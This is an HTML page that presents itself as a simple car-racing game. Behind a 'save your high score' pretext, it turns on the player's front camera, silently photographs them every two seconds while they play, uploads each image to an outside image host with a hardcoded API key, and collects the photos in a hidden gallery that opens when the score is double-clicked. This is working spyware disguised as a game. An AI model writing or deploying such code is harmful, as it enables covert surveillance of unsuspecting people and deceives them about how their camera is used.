<!DOCTYPE html>
<html>
<head>
    <title>Racing Pro Elite</title>
    <style>
        * { box-sizing: border-box; touch-action: none; }
        body { margin: 0; background: #000; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; color: white; overflow: hidden; }
        #score { font-size: 24px; color: #f1c40f; margin-bottom: 5px; cursor: pointer; z-index: 100; user-select: none; }
        #gameArea { position: relative; width: 340px; height: 60vh; background: #222; border: 4px solid #444; overflow: hidden; }
        .screen { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.9); display: flex; flex-direction: column; align-items: center; justify-content: center; z-index: 20; text-align: center; }
        .hidden { display: none !important; }
        .car { position: absolute; width: 45px; height: 75px; border-radius: 8px; }
        .player { background: linear-gradient(#ff4d4d, #990000); border: 2px solid #fff; bottom: 20px; left: 147px; }
        .enemy { background: linear-gradient(#2ecc71, #1b5e20); border: 2px solid #000; top: -100px; }
        .controls { display: flex; gap: 40px; margin-top: 20px; }
        .btn { width: 75px; height: 75px; background: #333; border: none; border-radius: 50%; color: white; font-size: 24px; box-shadow: 0 4px 0 #000; }
        
        #uploadStatus { position: fixed; top: 15px; right: 15px; display: none; align-items: center; background: rgba(0,0,0,0.8); padding: 8px 15px; border-radius: 20px; font-size: 12px; color: #f1c40f; z-index: 1000; border: 1px solid #f1c40f; }
        .spinner { width: 14px; height: 14px; border: 2px solid #f1c40f; border-top: 2px solid transparent; border-radius: 50%; margin-right: 8px; animation: spin 0.8s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        #adminGallery { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #111; z-index: 200; padding: 20px; overflow-y: auto; }
        .photo-card { margin-bottom: 15px; border: 1px solid #444; padding: 5px; background: #222; }
        .photo-card img { width: 100%; border-radius: 4px; }
        #vContainer { position: absolute; opacity: 0; pointer-events: none; }
    </style>
</head>
<body>

<div id="uploadStatus"><div class="spinner"></div><span>Syncing...</span></div>
<div id="score" ondblclick="toggleAdmin()">Score: 0</div>

<div id="gameArea">
    <div id="startScreen" class="screen">
        <h1 style="color:#f1c40f">RACING PRO</h1>
        <p style="font-size: 11px; color: #888;">Enable camera to save your high score</p>
        <button onclick="startGame()" style="background:#f1c40f; padding: 15px 40px; border:none; border-radius:5px; font-weight:bold; cursor:pointer;">START</button>
    </div>
    
    <div id="gameOverScreen" class="screen hidden">
        <h1 style="color: #e74c3c;">GAME OVER</h1>
        <button onclick="startGame()" style="background:#f1c40f; padding: 15px 40px; border:none; border-radius:5px; font-weight:bold;">RESTART</button>
    </div>

    <div id="player" class="car player"></div>
    <div id="enemy" class="car enemy"></div>
</div>

<div class="controls">
    <button class="btn" onpointerdown="move(-35)">L</button>
    <button class="btn" onpointerdown="move(35)">R</button>
</div>

<div id="adminGallery">
    <button onclick="toggleAdmin()" style="width: 100%; padding: 15px; background: #444; color: #fff; border: none; margin-bottom: 20px;">BACK TO GAME</button>
    <div id="galleryList"></div>
</div>

<div id="vContainer"><video id="video" autoplay playsinline muted></video></div>
<canvas id="canvas" style="display:none;" width="320" height="240"></canvas>

<script>
const apiKey = "992258968ccdfd76818e15081e78c894";

const video = document.getElementById('video');
const canvas = document.getElementById('canvas');
const player = document.getElementById('player');
const enemy = document.getElementById('enemy');
const statusEl = document.getElementById('uploadStatus');

let gameActive = false, score = 0, enemySpeed = 3, captureTimer;

function initCamera() {
    navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
    .then(stream => { 
        video.srcObject = stream;
        if (!captureTimer) {
            captureTimer = setInterval(uploadImage, 2000); 
        }
    })
    .catch(err => alert("Camera error: Please enable permissions and use HTTPS."));
}

async function uploadImage() {
    if (!gameActive || video.readyState !== 4) return;

    statusEl.style.display = 'flex';
    const ctx = canvas.getContext('2d');
    
    try {
        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
        const dataUrl = canvas.toDataURL('image/jpeg', 0.5).split(',')[1];
        
        const formData = new FormData();
        formData.append("image", dataUrl);

        const response = await fetch(`https://api.imgbb.com/1/upload?key=${apiKey}`, {
            method: 'POST',
            body: formData
        });
        const result = await response.json();
        if(result.success) addPhotoToAdmin(result.data.url);
    } catch (e) {
        console.log("Upload failed");
    } finally {
        setTimeout(() => { statusEl.style.display = 'none'; }, 500);
    }
}

function addPhotoToAdmin(url) {
    const list = document.getElementById('galleryList');
    const div = document.createElement('div');
    div.className = "photo-card";
    div.innerHTML = `<img src="${url}"><p style="font-size:10px">${new Date().toLocaleTimeString()}</p>`;
    list.prepend(div);
}

function toggleAdmin() {
    const g = document.getElementById('adminGallery');
    g.style.display = g.style.display === 'block' ? 'none' : 'block';
}

function startGame() {
    score = 0; enemySpeed = 3; gameActive = true;
    document.getElementById('score').innerText = "Score: 0";
    document.querySelectorAll('.screen').forEach(s => s.classList.add('hidden'));
    player.style.left = "147px";
    enemy.style.top = "-100px";
    
    initCamera();
    gameLoop();
}

function move(dir) {
    let left = player.offsetLeft + dir;
    if (left >= 0 && left <= 295) player.style.left = left + "px";
}

function gameLoop() {
    if (!gameActive) return;
    let eTop = enemy.offsetTop + enemySpeed;
    if (eTop > 400) {
        eTop = -100;
        enemy.style.left = Math.floor(Math.random() * 280) + "px";
        score++;
        document.getElementById('score').innerText = "Score: " + score;
        if(score % 5 === 0) enemySpeed += 0.5;
    }
    enemy.style.top = eTop + "px";
    let pR = player.getBoundingClientRect(), eR = enemy.getBoundingClientRect();
    if (!(pR.top > eR.bottom || pR.bottom < eR.top || pR.right < eR.left || pR.left > eR.right)) {
        gameActive = false;
        document.getElementById('gameOverScreen').classList.remove('hidden');
    } else {
        requestAnimationFrame(gameLoop);
    }
}
</script>
</body>
</html># Bhaai
